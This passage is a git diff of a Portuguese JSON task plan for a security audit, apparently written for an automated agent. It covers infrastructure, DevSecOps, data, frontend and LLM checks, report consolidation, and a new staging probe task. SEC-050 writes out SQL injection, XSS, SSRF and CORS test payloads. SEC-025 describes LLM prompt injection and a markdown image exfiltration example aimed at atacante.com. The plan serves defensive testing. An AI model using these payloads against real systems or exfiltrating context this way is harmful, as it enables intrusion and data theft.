arquivo, nomes de library. OUTPUT FORMAT: (A) 'reports/phase2/logging-monitoring-audit.md'. (B) 'reports/phase2/results/SEC-020.json' — {check_id, status, severity_if_fail, evidence, remediation} para LM-001 a LM-006. DONE WHEN: 6 checks executados; error handler global identificado e avaliado; audit trail verificado.",
       "status": "todo",
-      "depends_on": ["SEC-003"],
+      "depends_on": [
+        "SEC-003"
+      ],
       "targets": [
         "src/config/logger*",
         "src/middleware/logging*",
@@ -359,9 +385,11 @@
       "task_id": "SEC-021",
       "task_kind": "impl",
       "title": "Auditar Infraestrutura",
-      "description": "Verificar HTTPS, firewall, WAF, segmentação de rede, backups e proteção DDoS. Playbook: infrastructure (IF-001 a IF-006).",
+      "description": "Executar auditoria de infraestrutura cobrindo os 6 checks do playbook infrastructure (IF-001 a IF-006). Depende de SEC-002 para ter o mapa de arquitetura. O objetivo é garantir que a infraestrutura tem HTTPS obrigatório, firewall configurado, segmentação de rede, backups automáticos e proteção DDoS. CHECKS A EXECUTAR: (IF-001) HTTPS opcional: verificar em nginx.conf, docker-compose, k8s Ingress e terraform se HTTP redireciona para HTTPS; verificar se certificado TLS está configurado — complementa CR-001 com foco em config de infra. (IF-002) Sem firewall: verificar security groups em terraform (aws_security_group); network policies em k8s; ufw/iptables rules; docker-compose ports expostos — portas de DB (5432, 3306, 27017, 6379) não devem estar expostas publicamente. (IF-003) Sem WAF: buscar por Cloudflare, AWS WAF, Azure WAF, ModSecurity, Kong rate-limit plugin; WAF com OWASP Core Rule Set é camada adicional de defesa para SQLi, XSS, RCE. (IF-004) Sem segmentação de rede: verificar se banco de dados está em rede privada separada da aplicação; em docker-compose: DB deve estar em rede interna sem ports expostos; em k8s: verificar NetworkPolicy; em cloud: verificar subnets privadas vs públicas. (IF-005) Sem backups: buscar por scripts de backup, pg_dump, snapshot schedule em terraform/infra; verificar se backups são armazenados em localização diferente (cross-region); verificar se há restore testado. (IF-006) Sem proteção DDoS: verificar se CDN com proteção DDoS está na frente (Cloudflare, AWS CloudFront+Shield, Azure CDN); verificar se IP do origin server não está exposto diretamente. OUTPUT FORMAT: (A) 'reports/phase2/infrastructure-audit.md'. (B) 'reports/phase2/results/SEC-021.json' — {check_id, status, severity_if_fail, evidence, remediation} para IF-001 a IF-006. DONE WHEN: 6 checks executados; portas expostas de todos os serviços listadas e avaliadas.",
       "status": "todo",
-      "depends_on": ["SEC-002"],
+      "depends_on": [
+        "SEC-002"
+      ],
       "targets": [
         "docker-compose*.yml",
         "Dockerfile*",
@@ -384,9 +412,11 @@
       "task_id": "SEC-022",
       "task_kind": "impl",
       "title": "Auditar DevSecOps",
-      "description": "Avaliar code review, pipeline de segurança, secrets scanning, SAST, DAST e audit trail de deploy. Playbook: devsecops (DO-001 a DO-006).",
+      "description": "Executar auditoria de DevSecOps cobrindo os 6 checks do playbook devsecops (DO-001 a DO-006). Depende de SEC-011 para ter contexto de dependências. O objetivo é verificar se o pipeline de CI/CD tem gates de segurança automáticos — secrets scanning, SAST, audit de dependências — e se o processo de code review inclui critérios de segurança. CHECKS A EXECUTAR: (DO-001) Sem code review obrigatório: verificar CODEOWNERS e branch protection rules no repositório; verificar se PRs requerem aprovação antes de merge em branches protegidas (main, master, production). (DO-002) Sem secrets scanning no CI: verificar pipelines em .github/workflows/, .gitlab-ci.yml, Jenkinsfile por gitleaks, truffleHog, detect-secrets, secretlint — ausência significa que segredos commitados acidentalmente só são descobertos manualmente. (DO-003) Sem SAST: verificar se há análise estática de segurança no pipeline — sonarqube, semgrep, bandit (Python), gosec (Go), eslint-plugin-security (JS); verificar sonar-project.properties se existir. (DO-004) Sem audit de dependências no CI: verificar se npm audit, pip-audit, govulncheck roda no pipeline — CI deve falhar em vulnerabilidades críticas/altas; complementa DS-001 com foco no processo automatizado. (DO-005) Pipeline sem ambientes separados: verificar se há jobs distintos para staging e production; verificar se deploy para produção requer aprovação manual ou gates automáticos de qualidade. (DO-006) Sem audit trail de deploy: verificar se há registro de quem deployou o quê e quando — GitHub Actions deployment history, release tags, changelog automático; ausência dificulta resposta a incidentes e rollback. OUTPUT FORMAT: (A) 'reports/phase2/devsecops-audit.md'. (B) 'reports/phase2/results/SEC-022.json' — {check_id, status, severity_if_fail, evidence, remediation} para DO-001 a DO-006. DONE WHEN: 6 checks executados; cada workflow de CI analisado passo a passo.",
       "status": "todo",
-      "depends_on": ["SEC-011"],
+      "depends_on": [
+        "SEC-011"
+      ],
       "targets": [
         ".github/workflows/",
         ".gitlab-ci.yml",
@@ -409,9 +439,11 @@
       "task_id": "SEC-023",
       "task_kind": "impl",
       "title": "Auditar Segurança de Dados",
-      "description": "Verificar proteção de PII, minimização, política de retenção, anonimização e conformidade LGPD/GDPR. Playbook: data_security (DA-001 a DA-005).",
+      "description": "Executar auditoria de segurança de dados cobrindo os 5 checks do playbook data_security (DA-001 a DA-005). O objetivo é verificar conformidade com LGPD/GDPR: proteção de PII, minimização de dados, política de retenção, anonimização e direitos dos titulares. CHECKS A EXECUTAR: (DA-001) PII sem proteção adequada: identificar campos PII nos schemas/models — nome completo, email, CPF, CNPJ, telefone, endereço, data de nascimento, dados de saúde, dados financeiros; verificar se há criptografia at-rest nesses campos ou se o banco usa encryption transparente; complementa CR-003 com foco em LGPD. (DA-002) Coleta excessiva de dados: verificar se formulários e APIs coletam apenas dados necessários para a finalidade — princípio da minimização da LGPD Art. 6°; identificar campos que podem não ter base legal. (DA-003) Sem política de retenção: verificar se há TTL ou job de limpeza para dados antigos — buscar por delete_after, retention_days, cleanup_job, soft_delete com data de expiração; verificar se logs e backups têm política de expiração. (DA-004) Sem anonimização/pseudonimização: verificar se para analytics, logs e ambientes de teste os dados são anonimizados — dados de produção em ambiente de staging sem anonimização é violação da LGPD. (DA-005) Sem resposta a direitos LGPD: verificar se há endpoint ou processo para: acesso aos dados do usuário, correção, exclusão (direito ao esquecimento), portabilidade — ausência em sistemas com usuários brasileiros é não-conformidade com LGPD Art. 18°. OUTPUT FORMAT: (A) 'reports/phase2/data-security-audit.md' com mapa de campos PII encontrados e sua proteção atual. (B) 'reports/phase2/results/SEC-023.json' — {check_id, status, severity_if_fail, evidence, remediation} para DA-001 a DA-005. DONE WHEN: 5 checks executados; inventário de campos PII gerado; base legal de coleta avaliada.",
       "status": "todo",
-      "depends_on": ["SEC-003"],
+      "depends_on": [
+        "SEC-003"
+      ],
       "targets": [
         "src/models/",
         "src/migrations/",
@@ -433,9 +465,11 @@
       "task_id": "SEC-024",
       "task_kind": "impl",
       "title": "Auditar Segurança de Frontend",
-      "description": "Verificar tokens em localStorage, HTML não sanitizado, dependências JS vulneráveis e lógica crítica no frontend. Playbook: frontend_security (FE-001 a FE-004).",
+      "description": "Executar auditoria de segurança de frontend cobrindo os 4 checks do playbook frontend_security (FE-001 a FE-004). O objetivo é garantir que tokens sensíveis não são armazenados de forma insegura no browser, que HTML dinâmico é sanitizado, que dependências JS não têm vulnerabilidades e que lógica crítica de negócio não existe apenas no cliente. CHECKS A EXECUTAR: (FE-001) Tokens em localStorage: verificar se JWT ou tokens de auth são armazenados em localStorage ou sessionStorage — isso os expõe a XSS; buscar por localStorage.setItem('token'), localStorage.setItem('jwt'), getItem('auth'); a alternativa segura é httpOnly cookie. (FE-002) HTML não sanitizado: buscar por dangerouslySetInnerHTML (React), v-html (Vue), [innerHTML] (Angular), insertAdjacentHTML, document.write com dados que vêm de API ou input do usuário; verificar se DOMPurify ou sanitize-html é usado antes de renderizar HTML dinâmico. (FE-003) Dependências JS vulneráveis: executar npm audit no diretório frontend; verificar se CDN scripts têm SRI (Subresource Integrity) — grep -rn 'integrity=' no HTML; scripts de CDN sem SRI podem ser comprometidos sem que a aplicação detecte. (FE-004) Lógica crítica apenas no frontend: buscar por cálculos de preço, validação de cupom, verificação de elegibilidade, check de limites em código JS/TS/JSX do frontend — qualquer regra de negócio que não seja replicada no backend pode ser bypassada pelo usuário inspecionando e modificando o código cliente. OUTPUT FORMAT: (A) 'reports/phase2/frontend-security-audit.md'. (B) 'reports/phase2/results/SEC-024.json' — {check_id, status, severity_if_fail, evidence, remediation} para FE-001 a FE-004. DONE WHEN: 4 checks executados; diretórios de frontend identificados e percorridos; npm audit executado.",
       "status": "todo",
-      "depends_on": ["SEC-003"],
+      "depends_on": [
+        "SEC-003"
+      ],
       "targets": [
         "src/components/",
         "src/pages/",
@@ -458,9 +492,11 @@
       "task_id": "SEC-025",
       "task_kind": "impl",
       "title": "Auditar Segurança de IA/LLM",
-      "description": "Avaliar prompt injection, escopo de ferramentas do LLM, filtragem de input, exfiltração de dados e audit log de decisões. Playbook: ai_llm_security (AI-001 a AI-005).",
+      "description": "Executar auditoria de segurança de IA/LLM cobrindo os 5 checks do playbook ai_llm_security (AI-001 a AI-005). Executar apenas se SEC-001 identificou componentes de IA/LLM (OpenAI, Anthropic, LangChain, agentes, etc.); caso contrário: gerar resultado not_applicable para todos os checks. CHECKS A EXECUTAR: (AI-001) Prompt injection possível: identificar onde prompts são construídos — buscar por chamadas a openai.chat.completions, anthropic.messages, langchain.invoke; verificar se user input é concatenado diretamente no system prompt sem delimitadores claros; padrão inseguro: `Você é um assistente. ${userMessage}`; padrão seguro: system prompt fixo + user message como campo separado. (AI-002) LLM com acesso irrestrito a ferramentas: verificar lista de tools/functions disponíveis ao LLM; buscar por tools:[...] ou functions:[...] nas chamadas de API; avaliar se alguma tool permite execução de código arbitrário, acesso irrestrito ao filesystem ou requests HTTP sem restrição de domínio; verificar se há human-in-the-loop para ações destrutivas. (AI-003) Sem filtragem de input: verificar se há moderação ou validação antes de enviar input ao LLM — buscar por content moderation, input filter, safety check, max token limit para input; sem limite de tamanho: usuário pode lotar a context window com lixo. (AI-004) Exfiltração via output: verificar se output do LLM é sanitizado antes de exibição — LLM pode gerar markdown com imagens externas <img src='https://atacante.com?data=...> para exfiltrar contexto; verificar se output passa por DOMPurify antes de render; verificar se system prompt pode vazar no output. (AI-005) Sem logs de decisão: verificar se interações com LLM são logadas — input (sanitizado de PII), output, model, tokens, latência, user_id; para agentes: verificar se tool calls e suas saídas são rastreáveis; ausência de logs impossibilita auditoria e detecção de abuso. OUTPUT FORMAT: (A) 'reports/phase2/ai-llm-security-audit.md'. (B) 'reports/phase2/results/SEC-025.json' — {check_id, status, severity_if_fail, evidence, remediation} para AI-001 a AI-005. DONE WHEN: 5 checks executados (ou not_applicable justificado); cada tool call do LLM listada e avaliada.",
       "status": "todo",
-      "depends_on": ["SEC-003"],
+      "depends_on": [
+        "SEC-003"
+      ],
       "targets": [
         "src/ai/",
         "src/agents/",
@@ -483,12 +519,25 @@
       "task_id": "SEC-030",
       "task_kind": "qa",
       "title": "Consolidar vulnerabilidades identificadas",
-      "description": "Agregar todas as vulnerabilidades encontradas na fase de auditoria em inventário único com IDs, domínio de origem e evidências técnicas.",
+      "description": "Agregar todos os achados das 16 tasks de auditoria (SEC-010 a SEC-025) em um único inventário estruturado de vulnerabilidades, deduplicado e normalizado, pronto para classificação em SEC-031. MÉTODO: (1) Ler todos os arquivos reports/phase2/results/SEC-0{10..25}.json. (2) Para cada arquivo: extrair todos os checks com status 'fail' ou 'partial'. (3) Para cada finding: criar um objeto de vulnerabilidade com os campos: finding_id (gerado: VULN-{SEQ:003}), source_task (ex: SEC-010), check_id (ex: SC-001), check_name, domain, status_from_check, severity_if_fail (herdado do check), evidence (copiado do resultado), remediation (copiado do resultado). (4) Deduplicar: se dois checks diferentes identificarem o mesmo problema (ex: SC-001 e SC-002 ambos encontrarem a mesma chave), consolidar em um único finding com referências a ambos. (5) Normalizar severity para o enum: CRITICAL | HIGH | MEDIUM | LOW | INFO. (6) Contar totais por severidade e por domínio. OUTPUT FORMAT: 'reports/phase3/vulnerability-inventory.json' com estrutura: { summary: { total, by_severity: {CRITICAL, HIGH, MEDIUM, LOW, INFO}, by_domain: {...} }, vulnerabilities: [ {finding_id, source_task, check_id, check_name, domain, severity, evidence: {files, lines, commands_output, description}, remediation} ] } ordenado por severity (CRITICAL primeiro). DONE WHEN: Todos os 16 result files lidos; inventário gerado sem findings duplicados; totais por severidade batem com a soma dos findings listados.",
       "status": "todo",
       "depends_on": [
-        "SEC-010", "SEC-011", "SEC-012", "SEC-013", "SEC-014",
-        "SEC-015", "SEC-016", "SEC-017", "SEC-018", "SEC-019",
-        "SEC-020", "SEC-021", "SEC-022", "SEC-023", "SEC-024", "SEC-025"
+        "SEC-010",
+        "SEC-011",
+        "SEC-012",
+        "SEC-013",
+        "SEC-014",
+        "SEC-015",
+        "SEC-016",
+        "SEC-017",
+        "SEC-018",
+        "SEC-019",
+        "SEC-020",
+        "SEC-021",
+        "SEC-022",
+        "SEC-023",
+        "SEC-024",
+        "SEC-025"
       ],
       "targets": [
         "reports/phase2/results/"
@@ -506,9 +555,11 @@
       "task_id": "SEC-031",
       "task_kind": "qa",
       "title": "Classificar severidade e impacto",
-      "description": "Atribuir severidade (CRITICAL/HIGH/MEDIUM/LOW/INFO) e avaliar impacto CIA (confidencialidade, integridade, disponibilidade) de cada vulnerabilidade com justificativa técnica.",
+      "description": "Classificar cada vulnerabilidade do inventário (SEC-030) com severidade CVSS-inspired e impacto CIA, produzindo o arquivo classificado que alimentará a matriz de riscos em SEC-032. MÉTODO: (1) Ler 'reports/phase3/vulnerability-inventory.json'. (2) Para cada vulnerabilidade: confirmar ou ajustar a severity_if_fail herdada do playbook — o playbook define severity_if_fail como padrão, mas o contexto do sistema pode elevar ou reduzir: ex. IDOR em sistema de saúde é mais grave que em app de notas; SQL injection com acesso a dados de terceiros é CRITICAL mesmo que o playbook diga HIGH. (3) Avaliar impacto CIA para cada finding: Confidentiality (C): dados sensíveis podem ser lidos por parte não autorizada? Integrity (I): dados podem ser modificados ou corrompidos? Availability (A): serviço pode ser interrompido? Escala: HIGH | MEDIUM | LOW | NONE para cada dimensão. (4) Escrever justificativa técnica de 1-3 frases para a severidade e para cada dimensão CIA. (5) Identificar se vulnerabilidade é explorável remotamente sem autenticação (isso eleva prioridade de correção). OUTPUT FORMAT: 'reports/phase3/classified-vulnerabilities.json' — cópia do inventário com campos adicionais por finding: { ...finding_original, severity_final (pode diferir de severity_if_fail), severity_justification, impact_cia: {C, I, A, justification}, exploitability: {remotely_exploitable, auth_required, complexity} }. DONE WHEN: Todos os findings classificados; justificativas escritas; nenhum finding com severity CRITICAL sem justificativa de impacto CIA.",
       "status": "todo",
-      "depends_on": ["SEC-030"],
+      "depends_on": [
+        "SEC-030"
+      ],
       "targets": [
         "reports/phase3/vulnerability-inventory.json"
       ],
@@ -525,9 +576,11 @@
       "task_id": "SEC-032",
       "task_kind": "qa",
       "title": "Gerar Matriz de Riscos",
-      "description": "Produzir matriz consolidada: vulnerabilidade × categoria × severidade × impacto × recomendação, ordenada por severidade decrescente.",
+      "description": "Gerar a Matriz de Riscos consolidada a partir dos findings classificados em SEC-031, produzindo os arquivos que alimentarão a fase de remediação (SEC-040 e SEC-041). MÉTODO: (1) Ler 'reports/phase3/classified-vulnerabilities.json'. (2) Construir matriz no formato: finding_id × domain × severity_final × impact_CIA × exploitability × recommended_action. (3) Ordenar por: (a) severity_final DESC (CRITICAL > HIGH > MEDIUM > LOW > INFO), (b) exploitability.remotely_exploitable DESC, (c) domain priority. (4) Para cada finding: escrever recommended_action resumido (máx 2 linhas). (5) Gerar sumário executivo da matriz: total de findings por severidade, domínios com mais problemas, top 5 riscos mais urgentes. OUTPUT FORMAT: Dois arquivos: (A) 'reports/phase3/risk-matrix.json' com estrutura: { summary: {total_findings, critical_count, high_count, medium_count, low_count, info_count, top_domains: [{domain, count, worst_severity}]}, matrix: [{finding_id, check_id, domain, title, severity_final, impact_cia, exploitability, recommended_action, source_evidence_ref}] }. (B) 'reports/phase3/risk-matrix.md' — tabela Markdown renderizável com as mesmas colunas, adequada para revisão humana. DONE WHEN: Ambos os arquivos gerados; findings ordenados por severidade; sumário com contagens corretas.",
       "status": "todo",
-      "depends_on": ["SEC-031"],
+      "depends_on": [
+        "SEC-031"
+      ],
       "targets": [
         "reports/phase3/classified-vulnerabilities.json"
       ],
@@ -545,9 +598,11 @@
       "task_id": "SEC-040",
       "task_kind": "spec",
       "title": "Propor correções técnicas",
-      "description": "Para cada vulnerabilidade CRITICAL e HIGH, detalhar correção técnica específica com snippets de código/configuração e esforço estimado.",
+      "description": "Para cada vulnerabilidade CRITICAL e HIGH da matriz de riscos (SEC-032), propor uma correção técnica específica, acionável e adaptada ao contexto tecnológico do sistema (identificado em SEC-001), com snippet de código/configuração e estimativa de esforço. MÉTODO: (1) Ler 'reports/phase3/risk-matrix.json' e filtrar findings com severity_final = CRITICAL ou HIGH. (2) Para cada finding: (a) identificar a tecnologia afetada com base no tech-stack-inventory.md — a correção de SQL injection em Node.js com Prisma é diferente de Python com SQLAlchemy; (b) escrever snippet de código concreto da correção — não 'use ORM', mas o código específico com parametrização usando a biblioteca identificada; (c) listar passos de implementação em ordem (ex: 1. instalar biblioteca, 2. refatorar função X, 3. remover código Y); (d) estimar esforço: TRIVIAL (< 1h), LOW (1-4h), MEDIUM (1-2 dias), HIGH (3-5 dias), COMPLEX (> 1 semana); (e) identificar se a correção requer downtime ou migração de dados. (3) Agrupar correções por tema quando possível (ex: 'todas as queries sem parametrização' podem ser abordadas com um único refactor de camada de repositório). OUTPUT FORMAT: 'reports/phase4/technical-remediations.md' com seção por finding: ## [FINDING_ID] [TÍTULO] — Severity: CRITICAL/HIGH **Problema:** descrição técnica. **Correção:** snippet + passos. **Esforço:** X. **Downtime:** sim/não. Ao final: tabela resumo de esforço total estimado por domínio. DONE WHEN: Todos os findings CRITICAL e HIGH têm correção com snippet; tabela de esforço total gerada; nenhuma correção é genérica sem adaptação à stack.",
       "status": "todo",
-      "depends_on": ["SEC-032"],
+      "depends_on": [
+        "SEC-032"
+      ],
       "targets": [
         "reports/phase3/risk-matrix.json"
       ],
@@ -564,9 +619,11 @@
       "task_id": "SEC-041",
       "task_kind": "spec",
       "title": "Documentar boas práticas",
-      "description": "Consolidar boas práticas de segurança organizadas por domínio, com referências a OWASP, CIS e NIST, verificando aplicabilidade ao contexto do sistema.",
+      "description": "Consolidar boas práticas de segurança organizadas por domínio, verificando aplicabilidade ao contexto do sistema, e referenciar frameworks de segurança (OWASP, CIS, NIST) para cada prática. Diferença de SEC-040: enquanto SEC-040 propõe correções para problemas encontrados, SEC-041 documenta o estado ideal a ser atingido — inclui práticas proativas mesmo onde não há FAIL. MÉTODO: (1) Ler 'reports/phase3/risk-matrix.json' e 'reports/phase2/results/' para entender o contexto. (2) Para cada domínio de auditoria: escrever seção com boas práticas — apenas as aplicáveis à stack e arquitetura identificadas (ex: práticas de Kubernetes só se há k8s; práticas de LLM só se há AI). (3) Para cada prática: incluir referência normativa (OWASP ASVS nível, CIS Control, NIST 800-53 controle). (4) Marcar práticas por prioridade: MUST (segurança básica), SHOULD (recomendado), NICE-TO-HAVE. (5) Incluir seção especial de práticas para o contexto brasileiro: LGPD Art. aplicável, conformidade com BACEN se fintech, CFM/SBIS se healthtech. OUTPUT FORMAT: 'reports/phase4/best-practices.md' com estrutura: ## [Domínio] — N práticas aplicáveis Para cada prática: **[MUST/SHOULD/NICE]** Título — Descrição (1-2 linhas) — Ref: OWASP/CIS/NIST. Ao final: checklist de conformidade com OWASP Top 10 (status: addressed/partial/not-addressed para cada item). DONE WHEN: Seção para cada domínio presente; referências normativas incluídas; OWASP Top 10 checklist gerado; práticas LGPD incluídas.",
       "status": "todo",
-      "depends_on": ["SEC-032"],
+      "depends_on": [
+        "SEC-032"
+      ],
       "targets": [
         "reports/phase3/risk-matrix.json",
         "reports/phase2/results/"
@@ -584,9 +641,12 @@
       "task_id": "SEC-042",
       "task_kind": "qa",
       "title": "Gerar Resumo Executivo",
-      "description": "Produzir resumo executivo (max 1 página) com score final de segurança (0-100) calculado pela fórmula em report-template.security.json (severity_weights × domain_priority_weights com penalty_rules), top 5 riscos prioritários e recomendações de ação imediata.",
+      "description": "Produzir o Resumo Executivo da auditoria — documento de máximo 1 página destinado a gestores não-técnicos e ao CISO — com o score final de segurança calculado pela fórmula determinística e os top 5 riscos prioritários. MÉTODO: (1) Ler 'reports/phase3/risk-matrix.json' para contagens de findings. (2) Calcular score de segurança (0-100): Base = 100. Dedução por finding: CRITICAL = -20pts, HIGH = -10pts, MEDIUM = -3pts, LOW = -1pt. Penalty adicional: domínios CRITICAL priority (secrets, auth, authorization, input_validation) com qualquer FAIL = -5pts adicionais. Floor = 0 (score nunca negativo). Arredondar para inteiro. (3) Classificar score: 90-100 = Excelente, 75-89 = Bom, 50-74 = Necessita atenção, 25-49 = Crítico, 0-24 = Comprometido. (4) Selecionar top 5 riscos: os 5 findings com maior severidade × exploitability do inventário classificado. (5) Para cada risco do top 5: escrever cenário de exploração realista em 2-3 linhas (o que um atacante faria e qual seria o impacto no negócio). (6) Listar ações imediatas: correções que podem ser implementadas em menos de 4h e que cobrem pelo menos os riscos CRITICAL. OUTPUT FORMAT: 'reports/phase4/executive-summary.md' com seções: ## Score de Segurança: [N]/100 — [Classificação] ## Contexto: data da auditoria, sistema auditado, escopo. ## Top 5 Riscos: tabela com finding_id, título, severidade, cenário de exploração. ## Ações Imediatas (próximas 24h): lista numerada. ## Próximos Passos (próximas 2 semanas): lista numerada. DONE WHEN: Score calculado com fórmula documentada; top 5 com cenários de exploração; documento cabe em 1 página A4 impressa.",
       "status": "todo",
-      "depends_on": ["SEC-040", "SEC-041"],
+      "depends_on": [
+        "SEC-040",
+        "SEC-041"
+      ],
       "targets": [
         "reports/phase4/technical-remediations.md",
         "reports/phase4/best-practices.md",
@@ -605,9 +665,11 @@
       "task_id": "SEC-043",
       "task_kind": "qa",
       "title": "Compilar Relatório Final de Auditoria",
-      "description": "Montar relatório completo projetando dados dos result files no report-template.security.json (schema) e REPORT_TEMPLATE.md (formato de renderização). Seções: header, executive_summary (com score calculado pela fórmula determinística), vulnerability_matrix, detailed_analysis por domínio, priority_risks com cenários de exploração, technical_recommendations em 4 tiers, e appendix com resultados completos e metadados de auditoria. Todos os achados rastreáveis aos checks do PARCER via check_id e finding_id.",
+      "description": "Compilar o Relatório Final de Auditoria completo consolidando todos os artefatos produzidos nas fases anteriores em um único documento coeso, rastreável e entregável, seguindo o schema de 'report-template.security.json' e o formato de renderização de 'REPORT_TEMPLATE.md'. MÉTODO: (1) Ler report-template.security.json para entender o schema de saída JSON esperado. (2) Ler REPORT_TEMPLATE.md para entender a estrutura de seções do documento. (3) Montar o relatório com as seguintes seções obrigatórias: (A) Header: metadados da auditoria (data, auditor, sistema, versão, escopo). (B) Executive Summary: conteúdo de reports/phase4/executive-summary.md, incluindo score calculado. (C) Vulnerability Matrix: tabela de reports/phase3/risk-matrix.md. (D) Detailed Analysis por domínio: para cada domínio (secrets, deps, auth... até ai_llm), seção com: checks executados, findings, evidências, status. (E) Priority Risks: top 10 riscos com cenários de exploração detalhados e business impact. (F) Technical Recommendations em 4 tiers: Tier 1 (< 24h, CRITICAL), Tier 2 (< 1 semana, HIGH), Tier 3 (< 1 mês, MEDIUM), Tier 4 (backlog, LOW/INFO). (G) Best Practices: conteúdo de reports/phase4/best-practices.md. (H) Appendix: resultados brutos completos dos 16 result files de phase2, metadados da auditoria (tool versions, timestamps), glossário. (4) Garantir rastreabilidade: cada finding no relatório deve ter finding_id, check_id e referência ao evidence. (5) Gerar versão JSON do relatório seguindo report-template.security.json schema. OUTPUT FORMAT: Dois arquivos: (A) 'reports/final/security-audit-report.md' — documento completo em Markdown. (B) 'reports/final/security-audit-report.json' — mesmo conteúdo em JSON estruturado segundo schema. DONE WHEN: Todas as seções presentes; todos os findings rastreáveis via finding_id; score no relatório bate com executive summary; nenhuma seção vazia ou com placeholder.",
       "status": "todo",
-      "depends_on": ["SEC-042"],
+      "depends_on": [
+        "SEC-042"
+      ],
       "targets": [
         "report-template.security.json",
         "REPORT_TEMPLATE.md",
@@ -626,11 +688,65 @@
       "immutability": {
         "done_is_immutable": true
       }
+    },
+    {
+      "task_id": "SEC-050",
+      "task_kind": "probe",
+      "title": "Executar checklist comportamental em staging",
+      "description": "Executar os 17 checks comportamentais do playbook runtime_behavioral (RT-001 a RT-017) contra o ambiente de staging deployed. Esta task é um probe — requer ambiente em execução, não analisa código-fonte. Deve ser executada APÓS SEC-043 (relatório estático completo) para servir como verificação de sanidade comportamental antes do deploy para produção. PRÉ-REQUISITOS OBRIGATÓRIOS (verificar antes de iniciar): (1) endpoint_base_url aponta para ambiente staging deployed e acessível. (2) Duas contas de teste criadas: User A e User B — logar em ambas e salvar session token/cookie. (3) Criar ao menos 1 recurso com User B (documento, pedido, perfil) e anotar o resource_id. (4) Se sistema usa BaaS (Supabase/Firebase): ter SUPABASE_URL e SUPABASE_ANON_KEY disponíveis. CHECKS A EXECUTAR (executar na ordem, registrar PASS/FAIL/NA para cada): (RT-001) BaaS RLS: curl com anon key e verificar se retorna dados reais — ver SC-009. (RT-002) Rotas sem auth: replay de request protegido sem token; replay com user regular em rota admin. (RT-003) Segredos no git: git ls-files .env; gitleaks detect (se disponível). (RT-004) IDOR: GET/PUT ${endpoint_base_url}/api/resources/${user_b_resource_id} com session de User A. (RT-005) Chaves no browser: DevTools Sources → buscar sk_, AKIA, Bearer, secret. (RT-006) SSRF: submeter http://127.0.0.1/, http://169.254.169.254/latest/meta-data/ em campos de URL. (RT-007) CSRF: arquivo HTML local com form apontando para endpoint de mudança de estado. (RT-008) Security headers: curl -I e verificar CSP, HSTS, X-Frame-Options, X-Content-Type-Options. (RT-009) CORS: curl -H 'Origin: https://evil.com' e verificar access-control-allow-origin. (RT-010) Brute force: loop de 50 requests ao endpoint de login e verificar se aparece 429. (RT-011) SQL injection: ' OR '1'='1 e '; DROP TABLE users; -- em campos de login e busca. (RT-012) XSS: <script>alert('XSS')</script> e <img src=x onerror=alert('XSS')> em campos de texto. (RT-013) Webhook: payload sem assinatura → deve retornar 400; mesmo event_id duas vezes → deve processar só uma. (RT-014) Upload executável: arquivo test.jpg com conteúdo <script>alert()</script>. (RT-015) Erros HTTP: enviar JSON malformado, ID inexistente, aspas simples — inspecionar response. (RT-016) Hash de senhas: grep por md5|sha1 no código; verificar formato de hashes no banco se acessível. (RT-017) Dependências: npm audit ou pip audit; verificar pacotes suspeitos. OUTPUT FORMAT: (A) 'reports/runtime/behavioral-checks.json' — array [{check_id, name, status: pass|fail|na, evidence, severity_if_fail, notes}] para RT-001 a RT-017. (B) 'reports/runtime/behavioral-checks-summary.md' — tabela com resultado de cada check e contagem de PASS/FAIL/NA. DONE WHEN: 17 checks executados ou marcados NA com justificativa; ambos os arquivos gerados; pré-requisitos confirmados no início do relatório.",
+      "status": "todo",
+      "depends_on": [
+        "SEC-043"
+      ],
+      "input_requirements": {
+        "required": [
+          "endpoint_base_url"
+        ],
+        "notes": "Ambiente de staging deployed obrigatório. Criar duas contas de teste antes de iniciar. Ver playbook runtime_behavioral para setup completo."
+      },
+      "targets": [
+        "${endpoint_base_url}",
+        "${repo_path}/.git"
+      ],
+      "outputs": {
+        "files": [
+          "reports/runtime/behavioral-checks.json",
+          "reports/runtime/behavioral-checks-summary.md"
+        ]
+      },
+      "immutability": {
+        "done_is_immutable": true
+      }
+    },
+    {
+      "task_id": "SEC-051",
+      "task_kind": "qa",
+      "title": "Incorporar resultados runtime no relatório final",
+      "description": "Consolidar os achados do checklist comportamental de runtime (SEC-050) no relatório final de auditoria já produzido (SEC-043), cruzando FAILs de runtime com findings da análise estática, atualizando o score de segurança se novos problemas foram descobertos, e adicionando a seção 'Runtime Verification' ao relatório. MÉTODO: (1) Ler 'reports/runtime/behavioral-checks.json'. (2) Ler 'reports/final/security-audit-report.json'. (3) Para cada check com status 'fail' no runtime: (a) Verificar se o problema já estava no vulnerability-inventory.json (finding_id correspondente). CASO A: finding já existia na análise estática → o runtime confirma o achado; adicionar nota 'Confirmed at runtime: [data]' ao finding existente. CASO B: finding NÃO existia na análise estática → criar novo finding com finding_id VULN-RT-{SEQ:003}, source_task=SEC-050, e adicionar ao inventário. (4) Recalcular score de segurança apenas se houver findings do CASO B (novos problemas): aplicar mesma fórmula de SEC-042 com o inventário expandido; documentar delta de score. (5) Adicionar seção '## Runtime Verification' ao relatório final com: tabela dos 17 checks (RT-001 a RT-017) com status PASS/FAIL/NA; lista de discrepâncias entre análise estática e probe dinâmico; score atualizado se diferente; nota de ambiente (staging vs produção). (6) Atualizar metadados do relatório: updated_at, runtime_verified: true, staging_url. OUTPUT FORMAT: Atualizar os dois arquivos existentes (não criar novos): (A) 'reports/final/security-audit-report.md' — com seção Runtime Verification inserida antes do Appendix. (B) 'reports/final/security-audit-report.json' — com runtime_verification object e findings atualizados. DONE WHEN: Seção Runtime Verification presente no relatório; todos os FAILs de RT-* mapeados para finding_id; score re-calculado se necessário; metadata updated_at atualizado.",
+      "status": "todo",
+      "depends_on": [
+        "SEC-050",
+        "SEC-043"
+      ],
+      "targets": [
+        "reports/runtime/behavioral-checks.json",
+        "reports/final/security-audit-report.json",
+        "reports/final/security-audit-report.md"
+      ],
+      "outputs": {
+        "files": [
+          "reports/final/security-audit-report.md",
+          "reports/final/security-audit-report.json"
+        ]
+      },
+      "immutability": {
+        "done_is_immutable": true
+      }
     }
   ],
   "indexes": {
     "by_status": {
-      "todo": 26,
+      "todo": 28,
       "in_progress": 0,
       "review": 0,
       "done": 0
@@ -638,7 +754,8 @@
     "by_kind": {
       "spec": 5,
       "impl": 16,
-      "qa": 5
+      "qa": 6,
+      "probe": 1
     }
   }
 }
